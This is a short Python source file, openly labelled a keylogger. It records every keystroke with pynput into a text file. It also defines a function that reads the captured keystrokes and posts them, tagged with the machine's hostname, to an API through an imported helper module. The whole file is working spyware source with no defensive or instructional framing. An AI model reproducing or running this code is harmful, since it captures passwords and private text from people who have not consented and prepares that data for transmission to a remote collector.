# Here we have to build the Python KeyLogger.
# Using pyInput  : For Key Logginh.
# Using requests : For Sending request to an API.
# Using pywin32 : To track the user windows OS state.

from pynput.keyboard import Listener
import socket

from apiCall import postRequest

file = "keyLogger.txt"


## This is a Simple Key Logger.
# It Saves the Text in the .txt File.
def onPressKey(key):
    try:
        with open(file, "a") as f:
            f.write(f'{key.char}')
    except Exception as e:
        with open(file, "a") as f:
            f.write(f'[{key}]')


# Now here you will read the file and it will send to the API.

def sendDataFromAPI():
    lines = ""
    with open('keyLogger.txt' , 'r') as f:
        lines = f.readlines()

    desktoId = socket.gethostname()

    # Here API will be called.
    postRequest(desktoId,lines)






with Listener(on_press=onPressKey) as listener:
    listener.join()